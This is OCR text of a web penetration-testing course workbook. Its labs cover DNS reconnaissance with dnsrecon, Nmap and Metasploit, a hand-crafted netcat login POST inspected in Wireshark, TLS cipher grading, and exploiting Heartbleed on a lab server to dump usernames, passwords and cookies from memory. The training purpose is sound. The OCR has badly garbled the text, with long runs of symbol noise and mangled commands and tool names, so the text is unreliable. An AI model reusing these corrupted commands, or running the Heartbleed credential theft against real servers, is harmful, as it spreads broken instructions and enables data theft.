$ wc -1 /opt/dnsrecon/namelist.txt 
Note: The wc command preforms a word count, and the -1 (lowercase 'ell,' not the number one) flag 
stands for lines. 
Nmap's default list at /usr /local/ share/nmap/nselib/data/vhosts-defaul t .1st only 
has 127 lines, as shown by: 
$ wc -1 /usr/local/share/nmap/nselib/data/vhosts-default.lst 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
\...J 
--.__,, 
--.__,, 
'-../ 
--.__,, 
--.__,, 
--.__,, 
\...J 
--.__,, 
--.__,, 
'----' 
\...J 
'-' 
l 
-....J 
'-' 
\.....; 
'-' 
'-..,/ 
-.._, 
\...J 
'-..,/ 
\.....; 
..._,, 
8 
'-.,,I 
'-.,,I 
--.__,, 
Either tool may use a custom word list. We can simulate dnsrecon.py's results with Nmap by giving it the 
same wordlist as a script argument: 
$ nmap --script=dns-brute sec542.com 
args=dns-prute.host1ist=/opt/dnsrecpp./namelist.txt 
Note: The command above would be entered on a single line, as indicated by the single$ prompt. 
Both test.sec542.com and cust42.sec542.com are interesting; we will dig deeper into their respective 
virtual host sites in a later lab. 
Reverse (PTR) Scan 
Let's use Metasploit's msfconsole interface to perform a reverse DNS scan of 192.168.1.0/24 
To open msfconsole, type the following commands in a terminal: 
$ cd /opt/metasploit-framework 
$ 
./m::3£.qe>nsole 
We will dive deeply into Metasploit during later labs. For now, let's begin with an auxiliary scan. 
Note: Metasploit supports tab-complete, which is the (lazy) administrator's friend. For example, type: 
msf > us.e aux<press TAB> 
After pressing the <TAB> key, Metasploit should complete "aux" as "auxiliary". 
Type the following at the msfconsole prompt: 
msf > use auxiliary/gather/dns_reverse_lookup 
msf > set RANGE 192.168.1.0/24 
msf > run 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
9 
fenn i11al 
..__,, 
!i;:J'p ~~,,.,-,:,~,:,½,~'~~·:·:\.1/.~?~a=,"'*~~,,~c.~r.nm,,:,,c,_,lb,,,,io;ii!:i,,mmicii,,,s,,:,a~~-.~~;·,·,;s,c 
msf > use auxiliary/gather/dns_reverse_lookup 
msf auxiliary(dns_reverse_'lookup) > set RANGE 192.168.1.0/24 
RANGE;;;> 192.168.1.0/24 
msf auxiliary(dns_reverse 
.... lookup} > run 
Running reverse lookup against IP range 192.168.1.0/24 
Host Name: mail2. sec542. org., IP Address: 192 .168. 1. 7 
Host Name: bar.sec542.org., IP Address: 192.168.1.18 
Host Name: mail.sec542.org., IP Address: 192.168.1.23 
Host Name: www.sec542.org., IP Address: 192.168.1.41 
Host Name: heartofgold.sec542.com., IP Address: 192.168.1.42 
Host Name: foo.sec542.org., IP Address.: 192.168.1.67 
[*J Auxiliary module execution completed 
msf auxiliary 
'-..,) 
..__,, 
~ 
'-./ 
'-./ 
'-./ 
'-.,I 
'-./ 
'-../ 
~ 
Note the scan has identified heartofgold.sec542.com, which has not been revealed via any previous DNS 
reconnaissance method. 
Note: Though not formally included in the lab, the following will show how to perform a reverse DNS scan 
using DNSRecon and Nmap. 
The previous step can also be accomplished via DNSRecon: 
$ dnsrecon.py -r 192.168.1.0/24 
This performs a reverse (-r) DNS scan of 192.168.1.0/24 
Or Nmap: 
$ nmap -sL 192.168.1.0/24 
This nmap command does the same, but is quite verbose and lists (- sL) every address from 192.169.1.0 
through 192.169.1.255. 
Appending I 
grep \) to the end provides a concise list of resolved reverse names. The grep command 
searches for a literal ")" character. The previous backslash ("\") is an escape, which treats the ")" as a literal 
character. This matches lines with a reverse DNS entry only: 
$inmap -sL 192.168.1.()/24 I 
grep \) 
So, why then use Metasploit? 
• 
Key qualities of successful penetration testers: Flexibility and tool independence 
• 
Familiarity with a range of core tools is critical to success 
'-./ 
'-.,I 
'-._.,- 
~ 
'-._.,- 
'-./ 
'-../ 
'-../ 
'-..,/ 
'-./ 
'-..,/ 
'-../ 
'-./ 
'-._.,- 
'-..,/ 
'-.,I 
'-.,I 
'-.,I 
'-.,I 
'-../ 
'-..,/ 
'-..,/ 
..__,, 
~ 
'-../ 
'-._.,- 
'-./ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
10 
..__; 
..__; 
~ 
~ 
• 
~ 
• 
..----_ 
~ 
..----_ 
..----_ 
~ 
~ 
..----_ 
..----_ 
~ 
~ 
..----_ 
~ 
~ 
..----_ 
..----_ 
~ 
~ 
~ 
..----_ 
~ 
~ 
~ 
,,----., 
~ 
~ 
Metasploit is a powerful tool that is often overlooked by web application penetration testers 
We will also use Metasploit heavily in later labs 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.1: DNS Harvesting 
11 
I Objectives 
• 
Reinforce understanding of HTIP requests and responses 
• 
Inspect HTIP traffic at the packet level via Wireshark 
• 
Appreciate HTIP traffic characteristics that could identify attack tools 
• 
Differentiate browser HTIP requests and a minimally crafted request--- 
!Lab Setup 
Log in to Security542 VM: 
Username: student 
Password: Securi ty542 
-------- 
Launch Wireshark by clicking the shark fin icon on the upper panel. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
1 
Press the shark fin icon inside of the Wireshark window (upper left) to start the capture. 
'--' 
\_,I 
-.._/ 
-.._/ 
'-.,I 
'----' 
\..._., 
Capture 
... using this tilter. fi l Enter a c.ipture f:,,"r ... 
•. 
'-.,I 
ethO 
__J~ 
'----' 
'-J 
'--' 
'--' 
jchal/enge: No Hints 
We will send an actual browser request and then craft a request with netcat. The goal is to understand 
basic HTTP requests and responses and identify the difference between an actual browser request and a 
minimal crafted request 
Initiate browser request 
• 
Go to Firefox-> Exercises tool bar -> HTTP Request/ Response. 
Netcat crafted HTTP request 
• 
Craft the following HTTP POST request and send via netcat to http://www. sec542. org 
POST /form_auth/login.p~p HTTP/1.0 
Content-Length: 34 
user=ma:rvin&pass=test&button=Login 
Review HTTP sessions in Wireshark 
• 
View both TCP streams in Wireshark. 
• 
Note differences that could differentiate the browser request from the crafted request. 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
\..._., 
\..._., 
'-J 
'----' 
'-' 
'-J 
'-" 
\..._., 
\..._., 
-.._/ 
'-" 
'-" 
\._./ 
'----' 
'----' 
'-J 
'-' 
'-..,I 
.___,, 
'-' 
-.._/ 
'-' 
\..._., 
'-..,I 
'-J 
2 
'----' 
-.._/ 
'--" 
!Step-by-Step Instructions 
Initiate HTTP Request with Firefox 
Warning: Be sure to have already launched Wireshark and begun capturing traffic prior to proceeding. 
Click the Firefox icon in the upper panel. 
,--. 
Go to the Exercises tool bar . 
• 
SANS Security542 ... Web 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
3 
Choose HTIP Request/ Response. 
'-_,I 
II Advancoo Usemame w,,,,,ru:,,-;..,,,. 
IISASE 
BeEF Com:rol Panel 
II Snake 
II Shellshock Netstat.cgi 
II SQL Injeaion 
II User Account Ht1M1sting 
II Web Authentication · Basic 
II Web Authentica(ion . Digest 
II Web Authentication· forms 
II Web Calem:lar 
II wordpress Admin 
illlXXE 
Allin Tabs 
You should see the following page: 
Welcome to 
Sec-542 
Ad\/am::ed Web Pen 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
'-_,I 
'-_,I 
'-' 
'-' 
'-' 
'-_,I 
'-' 
'-' 
''-../ 
'-' 
\......, 
'-' 
'-' 
'-../ 
'-' 
\......, 
'-../ 
'---' 
\......, 
\......, 
'-../ 
'-../ 
\......, 
'-../ 
\......, 
'-' 
'-../ 
'-' 
'-' 
\.J 
\......, 
'-._.,I 
\......, 
'-...,/ 
'-../ 
'-._.,I 
4 
'-_,I 
'-' 
'-' 
Craft HTTP POST with Netcat 
Open a terminal by clicking the terminal icon on the upper panel. 
We use netcat, the command-line "Swiss Army Knife" of network tools, to craft an HTTP request. Netcat 
sends data to or from a network socket. It's a simple but amazingly powerful tool. 
/"""'\ 
First, launch netcat by running the following in a terminal: 
Note: you will not see any output after running this command. 
$ nc www.sec542.org 80 
- + .. x 
[ -] $ nc WW'W. sec542. orq 80 
Now create an HTTP POST request by hand by typing the following bolded text: 
Note: The indications to <press enter> indicate you should press enter. Do not type "<press enter>" as part 
of your crafted HTTP request. 
POST /form_auth/login.php HTTP/1.0 <press enter> 
···· Content"'Iiength:· 34 <press enter> 
·· · 
· 
,.,"' 
<press enter> 
user=marvin&pass=te13t&button=Login <press enter> 
For reference, the full nc command and HTTP POST as seen in the terminal is seen in the following 
screenshot: 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
5 
www.sec542.org 88 
POST /fo 
h/login.php HTTP/l.0 
Content-Length: 34 
user=marvin&pas 
t&button=login 
Note: There must be a blank line between the Content-Length: 34 line and the line containing 
user=marvin&pass=test&button=Login 
If you're having trouble typing the syntax above, we added a hint: 
the file /home/ student/post. txt includes the POST text. You may use it to make the POST by 
typing the following: 
'-...,I 
'-...,I 
\.....I 
'-...,I 
'-...,I 
'-...,I 
\_; 
\_; 
'-...,I 
'-..,; 
\_; 
\_; 
'-...,I 
'-...,I 
'-../ 
/post.txt 
'-..../ 
'-...,I 
Note: If you see "Incorrect username or password" it means you typed the POST correctly. Unfortunately, 
Marvin's password doesn't seem to be "test". 
'-..../ 
'-..../ 
'-...,I 
-> 
ead> 
itle>Form Login</title> 
/head> 
<body> 
Hl>Error</H 
h ref=http: / /"ilww. sec 
n</ax/body> 
/html> 
\_; 
ion=login.php> 
r><br>Please <a 
,html>try agai 
'-..../ 
\_; 
'-..../ 
'-../ 
'-..../ 
\_; 
'-../ 
\_; 
'-..../ 
'-..../ 
'-..,; 
'-..../ 
'-..../ 
\_; 
'-../ 
'-...,I 
'-..../ 
\_; 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
6 
'-..,; 
'-..,; 
'-..,; 
Stop Packet Capture 
Stop the Wireshark capture by clicking the Stop capture icon. 
127 ,0.G.1 
127.0.0.1 
TCP 
68 
- 80 [ACK] Seq=-1 Ack=1 Win=437,,. 
380 GET l HTTP/1.1 
6.8 80 - 41804 [ACK] Se~=1 At:k=313 ldin.=4 •. 
~ 
Wireshark Filter 
Show the GETs and POST by typing http.request.method in the Wireshark filter window and press the 
arrow to the right of the search box, or simply hit <Enter>. 
427 GET /exercise.1. html HTTP/1. 1 
345 GET /sans.gif !-!TTP/1.1 
fill 
/for111 .. autiVlogin.php HTTP/1,G Con 
Wireshark should show two GETs associated with the Firefox request (requesting exercisel.html and 
sans.gif) and a POST triggered by the crafted netcat request. 
Note: Depending upon the browser's cached information and other browsing performed, there could be 
additional HTIP traffic beyond the two GETs and single POST specifically referenced with this exercise. 
• 
Next: Right-click "GET /exercisel.html. .. " and choose Follow-> TCP Stream to view the stream. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
7 
.!:gnore/Unlgnore Packet 
Set/Unset Tlme Reference 
Time Shift ... 
Packet Comment ... 
Edit Resolved Name 
Apply as Fllter 
Prepare a Riter 
Conversation Filter 
Colorize Conversation 
Ctrl+D 
cnr-r 
ctrl+Sh!ft+T 
ctrl+Alt+C 
158 POST /form_auth/logJn, pnp fffTP/1.!il con., 
189 GET /drupal7/cran .p!Ip HTTP/1 .. 1 
'--" 
Protocol Preferences 
Decode&s ... 
Show Packet In New l!Ylndow 
n 
Review TCP Stream for Firefox GET 
Wireshark displays client traffic in red and server traffic in blue. 
+ X 
GET /exerc1se1.html HTTP/1.1 
~ 
Host ; www. se,c542. org 
User-Agent; MoZilla/5. Q (X11; Ubuntu; Linux 
Gecko/2€1100181 
•J
. l 
Hretox/50.@ 
Accic¾pt: tli'J<t/fltml, !'lpplicat101vxr1tml+:.m11, apJ)l11C&t 
1I" 
B 
, 
AcceptwLanguage~ en-US,en;q=0.5 
• 
Accept-Encodi.flg: 9z1p, deflate 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Pragma: no-cache 
Cache-Control: no-cache 
HTTP/1. 1 209 OK 
Date: Thu, 02 l=eb 2Q17 18:58:4El GMT 
Server: Apache/2.4.7 (Ubuntu) 
Last-Modified: Sun, 21 Dec 2iU4 19:49:22 GMT 
ETag: "33e-50abf3d916ea5-gzip" 
Accept-Ranges: bytes 
vary: Accept-Encoding 
Content-Encoct1ng: gzip 
-~l~'!!II!!!'! 
'" ... ,,v,.,,~~ 
(6946 bytes} 
_ 
.., 
1 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
~ 
'--' 
'-' 
'-..,, 
'--' 
....__,, 
\.J 
'-' 
'--" 
'-' 
'-'"' 
'-· 
'-" 
'-' 
'--" 
'-../ 
'--" 
'--" 
'-J 
'-J 
'--" 
'-J 
'--" 
'-../ 
'--" 
'-../ 
.__, 
'-../ 
'-../ 
'-' 
.._,, 
'--" 
'-..,, 
'--" 
'-..,, 
.._,, 
'-J 
8 
\._,I 
'-../ 
'-../ 
Note the client header, including the User-Agent, Host, and other fields. Keep these in mind as you view 
the handcrafted request via netcat. 
"" 
Review TCP Stream for Crafted HTTP POST 
"' 
Close the TCP stream for the GET request. 
Press the "X" next to the filter window. 
Note: The stream number referenced above could vary based on traffic captured, browser state, and 
browsing. 
Again enter http.request.method in the Wireshark filter window and click the arrow. 
No. 
'rrme 
Source 
Destination 
Protocol 
Length Info 
4 0.8989634t11 
127.9.9.1 
121.e.0.r-··--mrP -·-··- .. 388 GET7 HTTP/1.1 
8 0.369712005 
127.fUl.1 
127.fl.0.1 
HTTP 
301 GET /favicon.ico ffTTP/1.1 
53 3.093438827 
127.l:I.G.1 
127.0.0.1 
HTTP 
427 GET /exercise1.html HTIP/1.i 
56 3.120900900 
127.0.G.1 
127.0.&.1 
HTTP 
345 GET /sans.gif IHTP/1.1 
Right-click on "POST /form_ au th/ login. php" and Follow-> TCP Stream. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
9 
+ 
If- 
+ 
127 .0.0.1 
127.0.0.1 
Protocol 
. Le1,gth Info 
380 GET I -f!TTP/:1.1 
301 GET /ravtccn.fco l-tTTP/1.1 
427 GET /exercise1.html HTIP/1.1 
345 GET /sans.gif liTIP/1. 1 
.M_ark/Unmark Packet 
!gnore/Unlgnore Packet 
set/unset Time Reference 
Tlme Shfft ... 
Edft Resolved Name 
Apply as F1 lter 
Prepare a Filter 
Conversation Filter 
Colorize Conversation 
Protocol Preferences 
necode tfi .. , 
Show Packet in New ~lndow 
Note in the following output how minimal the client header is, compared with the GET we just looked at. 
/form_auth/login. php HTTP/1. 0 
-Content-Length: 34 
user=marvin&pass=test&button=Login 
ITTTP/1.1 200 OK 
Date: Tim, 18 Jan 2018 20:59:31 G:MT 
Server : Apac!Je/2 . 4. 7 ( Ul:Rm tu) 
X-Powernd-By: PHP/5.5.9-1uhuntu4.20 
Vary: Accept-Encoding 
Content-Length: 340 
Connection: close 
Content-Type: text/html 
< !OOCTYPE html PUBLIC "-/ /W3C/ /DTD html 4. 01 Transitional/ Im" 
"http://www .. w3.org/TiVhtml4/loose.dtd"> 
<l1tml> 
<head> 
<title>Form Login</title> 
</head> 
<body> 
<form me:thod=post action=login.php> 
<H1>Error</H1>Incor rect usernane or password<br><!:lr>Please <a hrer=nt.tp : / / 
ww.~. sec542. org/form_auth/form_auth. html>try again</a></body> 
</html> 
f'ac.Jret: 1 SfJ.' 3;Ne=:;;,kts, 3 s;;jj)spkts, 3 turns. Click 
., 
f- 
Back 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
\._,; 
'--' 
v 
'-.J 
\,_/ 
'-.../ 
'--' 
'--' 
'--' 
\,_/ 
'-.../ 
'-" 
\,_/ 
\...../ 
\._,; 
'---' 
'--' 
'--' 
'-.../ 
'--' 
\,_/ 
'--' 
'--"' 
'--' 
'-.../ 
\,_/ 
'-.../ 
\...../ 
'--' 
'--' 
'--' 
'--' 
'-.J 
\,_/ 
\,_/ 
'--' 
'--' 
'--"' 
'-.../ 
10 
\.J 
'--' 
\...../ 
Also note the lack of additional client data from the hand-crafted POST: 
There are no User-Agents. There are no "Accept-" headers. Other oddities are also present 
compared to a normal browser request. 
As we progress through the course consider how your attack tools might show up for the client or 
application. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.2: Examining HTTP Requests and Responses 
11 
"' 
IQhJe.ctives 
• 
Leverage scripts to test HTIPS configurations 
• 
Gain hands-on experience with the Nmap NSE ssl-enum-ciphers script 
• 
Determine the weakest ciphers identified by ssl-enum-ciphers 
• 
Compare HTIPS configurations of multiple sites 
Setup 
Log in to Security542 VM: 
Username: student 
Password: Securi ty542 
Open a terminal by clicking the terminal icon on the upper panel or double-clicking the desktop icon. 
!challenge: No Hints 
Assess the HTIPS configurations of https: / /www. sec542. org and https: //heart.bleed by 
performing the following: 
• 
Use the Nmap NSE ssl-enum-ciphers script to test the cipher strength of the sites 
• 
Compare the two sites and identify which offers the weakest cipher 
• 
Determine which specific cipher is weakest 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.3: Testing HTTPS 
1 
[step-by-Step Instructions 
'--' 
Test https://www.sec542.org 
'--' 
Open a terminal and run this command: 
'--' 
'-..../ 
$ nmap -p 443 --script=ssl-enum-ciphers www.sec542.org -oN 
/tmp/www.sec:::542.org.nmap 
'---' 
'-..../ 
'-' 
Note: The command above would be entered on a single line, as indicated by the single$ prompt 
This tells nmap to run the ssl-enum-ciphers NSE script against https: / /www. sec542. org, and 
save the results to the file www. secS-42. org. nmap. 
Note the final "least strength" value: 
..,. 
- 
.,t 
)i, 
-~~e 
Edit 
View 
- 
Tabs 
H~fp 
I 
TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C 
I 
TLS_RSA_WITH_SEED_CBC_SHA (rsa 2948) - A 
I 
compressors: 
I 
NULL 
I 
cipher preference: client 
I 
\>Jarnings: 
I 
64-bi.t block cipher 3DES vulnerable to SWEET32 attack 
I 
64-bit block. cipher DES vulnerable to SWEET32 attack 
I 
Brok.en cipher RC4 is deprecated by RFC 7465 
I 
Ciphersuite uses MOS for message integrity 
f_ 
least strength: C 
Nmap done: l IP address (1 host up) scanned in 1.27 seconds 
c-1$ I 
https: / /www. sec542. org scores a rating of C from ssl-enum-ciphers. Shortly, we will show 
how to identify which cipher(s) are causing this rating. 
'-' 
'-' 
'-' 
'---' 
'-' 
'-..../ 
'-' 
'-' 
'-..../ 
'-.../ 
'-" 
'--' 
'-../ 
'---' 
'-../ 
\..J 
'-' 
'-" 
'-" 
'-' 
'-../ 
'-' 
'-../ 
'-' 
'-../ 
'--' 
'--' 
'-' 
'-../ 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.3: Testing HTTPS 
2 
'-' 
,.__., 
Test https://heart.bleed 
Open another terminal and run this command: 
$ nmap -p 443 --script=ssl-enum-ciphers heart.bleed -oN 
/tmp/heart.bleed.nmap 
Note: The command above would be entered on a single line, as indicated by the single $ prompt. 
The name "heart.bleed" was added to /etc/hosts and resolves to 127.3.3.3 (localhost). 
~ 
Note the final "least strength" value: 
__ , 
f 
TLS RSA WITH AES 128 GCM SHA256 (rsa 1824) 
- A 
I 
TLS=RSA=WITH=AES=l28=CBc:sHA256 (rsa 1824) - A 
( 
TLS RSA WITH AES 12.8 CBC SHA (rsa 1824) - A 
I 
TLS=RSA-WITH:CAMELLIA 128 CBC_SHA (r sa 1024) 
A 
I 
compressors: 
I 
NULL 
l 
cipher preference: server 
I 
warnings: 
I 
64-bit block cipher 3DES vulnerable to SWEET32 attack 
I 
Weak certificate signature: SHAl 
I. 
least strength: D 
-- 
Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds 
(-]$ 
https: //heart.bleed scores a rating of D from ssl-enum-ciphers. Shortly, we will identify 
which cipher(s) are causing this rating. 
Find the Weak Ciphers 
ht tps: / /www. sec542. org scores a rating of C 
ht tps: //heart. bleed scores a rating of D 
r--. 
Discover which heart. bleed cipher is causing the low grade . We are looking for the string " - D". 
Note: There is a space between the dash and the "D". We use grep to locate these lines of output and 
need to escape the"-" with a "\" character so that it is not interpreted as an option. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.3: Testing HTTPS 
3 
Discover which heart. bleed cipher is causing the low grade. Type the following: 
'-.../ 
Ensure there is a space between the " - " and the "D". 
There are a number of offending ciphers, as shown in the screenshot below. 
grep "\~ on /tmp/heart.bleed.nmap 
TLS ECOHE RSA WITH 3DES EDE CBC SHA (secp256rl) ~ D 
TLS-DHE RSA WITH 3DES EDE CBC SHA (dh 1024) ~ D 
TLS=)~SA)•IITH_30ES_EDE=CBC=SHA- ( rsa 1824) - 0 
TL.S_ECDHE_RSA_WITH_3DES_EOE_CBC_SHA (secp256rl) - 0 
TLS OHE RSA WITH 30ES EDE CBC SHA (dh 1024) - D 
TLS-RSA-WITH 3DES EDE-CBC-SHA-(rsa, 1824) - D 
TLS-ECDHE RSA WITH 3DES EDE CBC SHA (secp256rl) - D 
TLS-DHE RSA WITH 3DES EDE CBC SHA. 
(dh 1024) - D 
TLS=RSt-CWITH_30ES_EDE=CBC=SHJC 
( rsa 1024) - 0 
TLS_ECOHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256rl} - D 
TLS DHE RSA WITH 3DES EDE CBC SHA ( 
Ul24) - D 
TLS=RSA=WITH_3DES_EDE=CBC=SHA-(rsa, 1824) - D 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.3: Testing HTTPS 
'--' 
'--' 
/ 
'--' 
'--' 
'-.,,' 
'---' 
'---' 
'---' 
'--' 
'--' 
'---' 
'---' 
'-...., 
'---' 
'---' 
'-..,' 
'---' 
'---' 
'---- 
'---' 
'----' 
'----' 
'---' 
''-.../ 
'--' 
'--' 
'--' 
'---' 
'---' 
'---' 
'--' 
'-.../ 
'----' 
'-.../ 
'-.J 
'--' 
'---' 
4 
v 
'--' 
v 
iJif}(Jer:ei~ f..4 -·!:~ting aiJl 1:Ixp,Z6>i~ng · ne:~tbleetf :- 
x 
- 
~ 
- ~= - 
- 
- ~ 
- 
--: 
~ 
~ 
l 
~ 
~ 
I Objectives 
• 
Discover heartbleed vulnerability 
• 
Gain hands-on experience with the ssl-heartbleed Nmap NSE script 
• 
Exploit heartbleed to steal data from vulnerable system 
~ 
ILabSetup 
Log in to Security542 VM: 
Username: student 
Password: Securi ty542 
Open a terminal by clicking the terminal icon on the upper panel or double-clicking the desktop icon. 
!Challenge: No Hints 
Two targets are in scope for this lab: 
https://www.sec542.org 
https://heart.bleed 
• 
Use Nmap's ssl-heartbleed NSE script to determine if the targets are vulnerable to Heartbleed 
• 
Exploit the Heartbleed vulnerability to steal the following from a vulnerable OpenSSL server's RAM: 
o 
Username 
o 
Password 
o 
Cookie 
Note: SensePost's Heartbleed exploit script (heartbleed. py) is included in the course VM. 
Warning: RAM is unpredictable. This exercise usually requires running heartbleed. py twice in order to 
see credentials in RAM. However, it may require additional attempts, depending on the state of your RAM. 
Step-by-step instructions begin on the next page. 
,--.., 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.4: Testing and Exploiting Heartbleed 
1 
!step-by-Step Instructions 
\__.I 
'---' 
Targets 
We will use Nmap to perform a Heartbleed NSE scan on: 
• 
https://sec542.org 
• 
https://heart.bleed 
Note: The name "heart .bleed" was added to/ etc/hosts and resolves to 127.3.3.3 (localhost). 
ssl-heartbleed.nse sec542.org 
Use Nmap to run the ssl-heartbleed NSE script against ht tps: / / sec542. org 
Type the following in a terminal window: 
ssl 
Your output should look like the following screenshot: 
1r-a nmap ~p 443 • -scrfnt 
!starting Nmap 7.48 ( https://nmap.org) at 2818.-81-15 
:52 PST 
I 
1Nmap scan report for sec542. o rg ( 127. e. 0 .1) 
!Host 
up (0,808050s latency}. 
irDNS record for 127.0.0.l: Locatnest 
iPORT 
STATE SERVICE 
'443/tcp open 
ht tps 
Nmap 
l IP address (l host up) scanned in 
seconds 
[-]$ 
Does https: / / sec542. org appear vulnerable to Heartbleed? 
Note: There is no output from the ssl-heartbleed NSE script, indicating the server is not vulnerable. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1 .4: Testing and Exploiting Heartbleed 
'---' 
v 
v 
v 
-.__; 
,,,,_,, 
v 
v 
v 
' '--,/ 
' '--,/ 
-.__; 
'-..,,' 
'---' 
·-.__; 
'-' 
'-._/ 
'-' 
\._J 
'---' 
-.__; 
'-' 
'-' 
-.__; 
'--,/ 
'---' 
'-' 
'-J 
'-' 
\._J 
'-' 
'-J 
-.__; 
\._J 
'-../ 
'-' 
2 
'---' 
'-' 
\._J 
ssl-heartbleed.nse heart.bleed 
Use Nmap to run the ssl-heartbleed NSE script against https: //heart.bleed 
Type the following in a terminal window: 
Your output should look like the following screenshot: 
tarting Nmap 7.46 ( Mtps://nmap.org ) at 2Gl8-01-15 16:59 PST 
scan report for heart.bleed (127.3.3.3) 
tis up (G.eeeeses latency). 
T 
STATE SERVICE 
open https 
a serious vulnerability in the popular OpenSSL cryptographic sof 
for stealing informaticm intended to be protected by SSL/TLS encr 
State: \JULNl:RABLE 
Risk factor: High 
OpenSSL ver saons L0.1 and L0.2-beta releases (including LG.lf and l.0,2-betal) 
OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of syst 
protected by the vulnerable OpenSSL versions and could allow for disclosure of otharwi.s 
encrypted confidential information as weU as the encryption keys themselves. 
References: 
http://www.opens.st.org/news/secadv __ W14lil407 .. txt 
http:/ Jcvedetails. com/cva/2814-8168/ 
https://cve mitre.orglcgi•bin/cvaname.cg:i?name=CVE·2S14·0160 
: 1 IP address (l host up) scanned in 0.17 seconds 
"' 
Does ht tps: //heart. bleed appear vulnerable to Heartbleed? 
Note: See the difference in output compared to the previous scan against sec542. org. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1.4: Testing and Exploiting Heartbleed 
3 
Browse to https://heart.bleed 
'---' 
Let's use Sense Post's Heartbleed exploit script (heartbleed. py) to steal RAM from the vulnerable 
OpenSSL server. 
Open Firefox and surf to ht tps: //heart. bleed 
Note: You must use Firefox; Chrome handles the referrer field differently than Firefox. As a result, some 
values will not appear in the Heartbleed RAM dump you are about to perform. 
Note: Please remember to use https: If the website says, "It works!" then you left out the "s" in https. 
'----' 
'-.J 
'----' 
Click "Heartbleed Exercise". 
y 
- + 
;I( 
X 
G C 14 
No Proxy ,.., 
>> 
:t Mutlllidae ···;, bWAPP 
nginx OpenSSL server 
Heartbleed Exercise 
<111111111111 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1 .4: Testing and Exploiting Heartbleed 
'----' 
'----' 
'-../ 
'---' 
'-' 
'-' 
'----' 
'----' 
''----' 
'----' 
'----' 
'----' 
'----' 
. .__,, 
'-.J 
'-.J 
'----' 
'----' 
'-' 
'-../ 
.__, 
'----' 
.__, 
'-../ 
'-.J 
'----' 
.__, 
'---' 
'-../ 
'----' 
.__, 
4 
'-../ 
'-.J 
'----' 
Enter a Username and Password 
Enter any username and password. 
Note: Please remember what you entered for each. In the example below, we chose "firstusername" as 
the username, and "firstpassword" as the password. 
Then press "Submit". 
- 
= 
Welcome to the Heart (bleed) of Gold server! 
All tra.ffic is encrypted \Vith SSL. We take security seriously! 
Please enter your username and password to log in. 
Enter your usemsme [fimvsemam.e 
:------- 
Enter your password: j 
. 
-------- 
We will later dump these values from RAM via the Heartbleed exploit. 
" 
Note: RAM is unpredictable! Your RAM is different than your neighbor's RAM, etc. 
Note: This exercise usually requires running heartbleed. py twice in order to see credentials in RAM. 
However, it may require additional attempts, depending on the state of your RAM. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 1 .4: Testing and Exploiting Heartbleed 
5 
Run heartbleed.py 
\._./ 
\._./ 
Open a terminal window and type: 
'---' 
'---' 
Initial output should appear similar to the following, with aforementioned caveats about RAM being 
nondeterministic: 
canning heart.bleed on port 443 
ormecting ... 
ending Client Hello ... 
iting for Server Hello .... 
received message: type= 22, ver = 0302, length= 66 
received messag,e: type = 22, ver "' 0382, length = 569 
received messag,e: type = 22, ver = 0302, length "' 2G3 
received messag:e: type"' 22, ver"" 0382, length= 4 
TLS version was 1.2 
c::,ern.LUJg hea,rtbeat request, •. 
received message: type"' 24, ver = 0302, length= 16384 
heartbeat response: 
0880: 02 48 00 D8 03 02 53 43 SB 90 90 913 72 0B BC ac 
,@ •••• SC[ ... r ... 
0010: BC 2B 92 AS 48 97 CF BD 39 84 CC 16 8A 85 03 98 
• + .• H .•• 9 •••• , •• 
0020: 9F 77 04 33 04 DE 00 ee 66 ca 14 ca M c0 22 ca 
.w.3 
f .•.•• ~. 
ee3e: 21 ee 39 ee 38 ee as 00 87 ca eF ce es 00 35 ea 
!.9.8 
5. 
0040: 84 cs 12 c0 es cs 1c c0 1s 00 16 00 13 ca eo cs 
.•....•.•••••.•• 
00se: 83 00 aA ce 13 ca 09 c0 IF ce lE 00 33 00 32 00 
0060: 9A ee 99 00 45 00 44 ce eE ce 04 00 2F ea 96 00 
0010: 41 cs 11 c0 01 ce sc ca 02 1:10 05 00 04 00 1s 00 
8080: 12 00 89 00 14 00 11 80 88 00 06 00 03 00 FF 01 
.. 
0090: 08 00 49 00 0B 00 04 03 00 81 02 00 8A 08 34 ee 
L ..•••.•.•. 4. 
